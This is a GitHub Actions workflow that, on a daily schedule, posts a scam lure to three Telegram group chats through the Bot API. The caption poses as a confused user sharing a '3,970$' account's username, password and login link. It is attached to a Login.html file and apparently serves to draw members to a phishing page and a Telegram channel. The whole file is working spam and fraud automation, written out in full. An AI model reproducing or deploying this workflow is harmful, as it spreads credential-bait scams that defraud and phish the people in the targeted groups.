name: Send Message

on:
  schedule:
    - cron: '30 18 * * *'    # 10:00 PM
    - cron: '30 21 * * *'    # 1:00 AM
    - cron: '30 23 * * *'    # 3:00 AM
  workflow_dispatch:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  send:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Send messages based on time
        env:
          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
        run: |
          HOUR=$(date -u +%H)
          MINUTE=$(date -u +%M)
          
          echo "Current UTC time: $HOUR:$MINUTE"
          echo "Triggered by: ${{ github.event_name }}"
          
          # ============================================
          # GROUP 1 (10:00 PM = 18:30 UTC)
          # بازه: ۱۸:۳۰ تا ۱۸:۴۵
          # ============================================
          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "18" ] && [ "$MINUTE" -ge 30 ] && [ "$MINUTE" -lt 45 ]); then
            echo "✅ Sending to Group 1 (10:00 PM)"
            
            curl -s -X POST https://api.telegram.org/bot${BOT_TOKEN}/sendMessage \
            -d chat_id=-1002507938213 \
            -d text="Hey everyone 👋"
            
            sleep 3
            
            CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
            
            curl -s -F document=@Login.html \
            -F chat_id=-1002507938213 \
            -F caption="$CAPTION" \
            https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
          else
            echo "⏭️ Skipping Group 1 - time not matched ($HOUR:$MINUTE != 18:30-18:45)"
          fi
          
          # ============================================
          # GROUP 2 (1:00 AM = 21:30 UTC)
          # بازه: ۲۱:۳۰ تا ۲۱:۴۵
          # ============================================
          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "21" ] && [ "$MINUTE" -ge 30 ] && [ "$MINUTE" -lt 45 ]); then
            echo "✅ Sending to Group 2 (1:00 AM)"
            
            CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
            
            curl -s -F document=@Login.html \
            -F chat_id=-1002665528411 \
            -F caption="$CAPTION" \
            https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
          else
            echo "⏭️ Skipping Group 2 - time not matched ($HOUR:$MINUTE != 21:30-21:45)"
          fi
          
          # ============================================
          # GROUP 3 (3:00 AM = 23:30 UTC)
          # بازه: ۲۳:۳۰ تا ۲۳:۴۵
          # ============================================
          if [ "${{ github.event_name }}" == "workflow_dispatch" ] || ([ "$HOUR" == "23" ] && [ "$MINUTE" -ge 30 ] && [ "$MINUTE" -lt 45 ]); then
            echo "✅ Sending to Group 3 (3:00 AM)"
            
            CAPTION=$'How does this work?\nI don\'t really understand.\nWhat am I supposed to do with this?\nPlease help.\n\nbalance: 3,970$\nusername: john371\npassword: 2525561\n\nLogin: https://log-000.github.io/\nhttps://t.me/illuminati300/36'
            
            curl -s -F document=@Login.html \
            -F chat_id=-1002680039813 \
            -F caption="$CAPTION" \
            https://api.telegram.org/bot${BOT_TOKEN}/sendDocument
          else
            echo "⏭️ Skipping Group 3 - time not matched ($HOUR:$MINUTE != 23:30-23:45)"
          fi
